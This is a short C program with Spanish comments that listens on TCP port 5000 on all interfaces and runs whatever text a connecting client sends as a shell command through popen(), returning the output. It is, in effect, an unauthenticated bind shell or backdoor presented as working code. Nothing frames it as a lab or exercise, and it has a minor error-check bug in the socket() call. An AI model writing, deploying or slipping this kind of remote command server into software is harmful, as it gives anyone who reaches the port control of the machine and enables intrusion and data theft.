#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 5000
#define BUFFER_SIZE 1024

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    char buffer[BUFFER_SIZE];
    char result[BUFFER_SIZE];

    // Crear socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Error al crear socket");
        exit(EXIT_FAILURE);
    }

    // Configurar la dirección del servidor
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Asociar socket a puerto
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Error en bind");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Escuchar conexiones
    if (listen(server_fd, 1) < 0) {
        perror("Error en listen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Servidor escuchando en el puerto %d...\n", PORT);

    // Aceptar conexiones entrantes
    socklen_t addr_len = sizeof(address);
    if ((client_fd = accept(server_fd, (struct sockaddr *)&address, &addr_len)) < 0) {
        perror("Error al aceptar conexión");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Cliente conectado.\n");

    // Recibir y procesar comandos
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            printf("Conexión cerrada por el cliente.\n");
            break;
        }
        buffer[bytes_received] = '\0';
        printf("Comando recibido: %s\n", buffer);

        // Ejecutar el comando y capturar la salida
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            perror("Error al ejecutar comando");
            continue;
        }

        memset(result, 0, BUFFER_SIZE);
        fread(result, 1, BUFFER_SIZE - 1, fp);
        pclose(fp);

        // Enviar resultado al cliente
        send(client_fd, result, strlen(result), 0);
    }

    close(client_fd);
    close(server_fd);
    return 0;
}

